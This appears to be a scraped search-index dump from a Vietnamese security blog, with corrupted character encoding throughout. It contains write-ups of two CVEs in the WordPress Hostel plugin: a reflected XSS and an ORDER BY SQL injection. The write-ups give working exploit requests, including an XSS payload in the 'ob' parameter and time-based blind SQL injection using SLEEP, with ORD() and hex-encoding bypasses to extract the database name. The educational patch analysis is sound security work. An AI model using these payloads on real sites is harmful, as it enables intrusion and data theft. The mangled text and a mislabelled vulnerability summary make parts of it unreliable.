ƒë·ªÅ if:\nTrong view, ƒëo·∫°n code XSS payload ch·ªâ hi·ªÉn th·ªã khi:\nif($offset \u0026gt; 0) =\u0026gt; t·ª©c l√† ph·∫£i c√≥ offset t·ª´ 1 tr·ªü l√™n. Mu·ªën offset \u0026gt; 0 c√≥ √Ω nghƒ©a, c∆° s·ªü d·ªØ li·ªáu ph·∫£i c√≥ √≠t nh·∫•t 2 booking. N·∫øu ch·ªâ c√≥ 1 booking th√¨ sau khi b·ªè qua 1 d√≤ng (offset=1), kh√¥ng c√≤n d·ªØ li·ªáu n√†o ƒë·ªÉ hi·ªÉn th·ªã, n√™n payload c≈©ng kh√¥ng render ra. üëâ Do ƒë√≥, ƒë·ªÉ khai th√°c th√†nh c√¥ng, c·∫ßn c√≥ t·ªëi thi·ªÉu 2 booking trong database.\nCu·ªëi c√πng c√°c k·∫øt qu·∫£ ƒë∆∞·ª£c ch·ª©a trong c√°c bi·∫øn s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã ra views th√¥ng qua h√†m include()\nif(@file_exists(get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;)) include get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;; else include(WPHOSTEL_PATH.\u0026#34;/views/bookings.html.php\u0026#34;);\tWPHOSTEL_PATH c√≥ th·ªÉ l√† h·∫±ng global ƒë∆∞·ª£c s·ª≠ d·ª•ng sau khi file PHP ch·ª©a n√≥ ƒë∆∞·ª£c load, ƒê·ªÉ bi·∫øt ƒë∆∞·ª£c ch√≠nh x√°c, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a WPHOSTEL_PATH.\nüëâ WPHOSTEL_PATH b√¢y gi·ªù l√† ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi t·ªõi th∆∞ m·ª•c ch·ª©a file hi·ªán t·∫°i.\nExploit Request v·ªõi XSS payload\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;offset=1\u0026amp;ob=\u0026#34;\u0026gt;\u0026lt;img+src%3D1+onerror%3Dalert%28document.domain%29\u0026gt; HTTP/1.1 Payload th·ª±c t·∫ø:\n\u0026#34;\u0026gt;\u0026lt;img src=x onerror=alert(document.domain)\u0026gt; ƒê√≥ng th·∫ª \u0026lt;a\u0026gt; b·∫±ng k√Ω t·ª± \u0026quot;\u0026gt;. Ch√®n th√™m th·∫ª \u0026lt;img\u0026gt; c√≥ thu·ªôc t√≠nh onerror ƒë·ªÉ k√≠ch ho·∫°t JavaScript. D√πng alert(document.domain) thay cho alert(1) nh∆∞ m·ªôt th√≥i quen, nh·∫±m ch·ª©ng minh r√µ r√†ng kh·∫£ nƒÉng ƒë·ªçc th√¥ng tin t·ª´ DOM. ƒêi·ªÅu n√†y c≈©ng gi√∫p tr√°nh tr∆∞·ªùng h·ª£p Sandbox Domain khi·∫øn cho t√°c ƒë·ªông c·ªßa payload b·ªã xem nh·∫π ho·∫∑c kh√¥ng c√≥. K·∫øt qu·∫£:\nConclusion L·ªó h·ªïng CVE-2025-6234 trong plugin WordPress Hostel b·∫Øt ngu·ªìn t·ª´ vi·ªác kh√¥ng x·ª≠ l√Ω ƒë√∫ng d·ªØ li·ªáu ƒë·∫ßu v√†o ($_GET['ob']) tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n giao di·ªán. ƒêi·ªÅu n√†y m·ªü ra kh·∫£ nƒÉng cho attacker ch√®n m√£ ƒë·ªôc Reflected XSS.\nB·∫£n v√° ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch s·ª≠ d·ª•ng h√†m esc_attr() ƒë·ªÉ escape d·ªØ li·ªáu tr∆∞·ªõc khi in ra HTML, ƒë·∫£m b·∫£o r·∫±ng c√°c gi√° tr·ªã kh√¥ng tin c·∫≠y kh√¥ng th·ªÉ ch√®n script ƒë·ªôc h·∫°i.\nKey takeaways:\nLu√¥n sanitize d·ªØ li·ªáu ƒë·∫ßu v√†o v√† escape d·ªØ li·ªáu ƒë·∫ßu ra theo ng·ªØ c·∫£nh (context). V·ªõi WordPress, t·∫≠n d·ª•ng c√°c h√†m built-in nh∆∞ sanitize_text_field(), esc_attr(), esc_html(), wp_kses()\u0026hellip; ƒë·ªÉ gi·∫£m thi·ªÉu r·ªßi ro b·∫£o m·∫≠t. References XSSCross-site scripting (XSS) cheat sheet - PortSwigger\nWordPress Hostel Plugin \u0026lt; 1.1.5.8 is vulnerable to Cross Site Scripting (XSS) - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-08-28-cve-2025-6234/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eHostel\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.8\u003c/strong\u003e. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ t·∫•n c√¥ng ng∆∞·ªùi d√πng c√≥ quy·ªÅn cao nh∆∞ \u003cstrong\u003eadmin\u003c/strong\u003e.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-6234\"\u003eCVE-2025-6234\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 1.1.5.8\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: Medium (7.1)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.7(vul) v√† v1.1.5.8(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n g·ªëc r·ªÖ do kh√¥ng th·ª±c hi·ªán \u003cstrong\u003esanitize\u003c/strong\u003e (l√†m s·∫°ch d·ªØ li·ªáu) v√† \u003cstrong\u003eescape\u003c/strong\u003e (m√£ h√≥a d·ªØ li·ªáu ƒë·∫ßu ra) ƒë·ªëi v·ªõi m·ªôt tham s·ªë tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n trang, d·∫´n ƒë·∫øn l·ªó h·ªïng \u003cstrong\u003eReflected Cross-Site Scripting (XSS)\u003c/strong\u003e\u003c/p\u003e","title":"CVE-2025-6234"},{"content":"Introduction CVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Summary: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë ob trong ph·∫ßn Manage Bookings.\nBackground Hostel Plugin cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p:\nForm ƒë·∫∑t ph√≤ng L·ªãch ph√≤ng Qu·∫£n l√Ω bookings Exploitation Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Code Comparison S·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } {: file=\u0026ldquo;controlers/bookings.php v1.1.5.6\u0026rdquo;}\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } {: file=\u0026ldquo;controlers/bookings.php v1.1.5.7\u0026rdquo;}\nüëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nDetect SQLi ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C·∫•u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } {: file=\u0026ldquo;models/hostel.php\u0026rdquo; v1.1.5.6 }\n·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() {: file=\u0026ldquo;hostel.php\u0026rdquo; }\nadd_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ lo·∫°i b·ªè/escape HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nAutomated Extraction Vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông h√≥a qu√° tr√¨nh t·∫•n c√¥ng: Script\nRemediation C·∫≠p nh·∫≠t l√™n Hostel Plugin v1.1.5.7 ho·∫∑c m·ªõi h∆°n\nTakeaways sanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-08-25-cve-2025-39566/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eSummary\u003c/strong\u003e: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë \u003ccode\u003eob\u003c/code\u003e trong ph·∫ßn \u003cstrong\u003eManage Bookings\u003c/strong\u003e.\u003c/p\u003e\n\u003ch2 id=\"background\"\u003eBackground\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eForm ƒë·∫∑t ph√≤ng\u003c/li\u003e\n\u003cli\u003eL·ªãch ph√≤ng\u003c/li\u003e\n\u003cli\u003eQu·∫£n l√Ω bookings\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"exploitation\"\u003eExploitation\u003c/h2\u003e\n\u003ch3 id=\"requirements\"\u003eRequirements\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"code-comparison\"\u003eCode Comparison\u003c/h3\u003e\n\u003cp\u003eS·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/p\u003e","title":"CVE-2025-39566"},{"content":"Introduction WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i 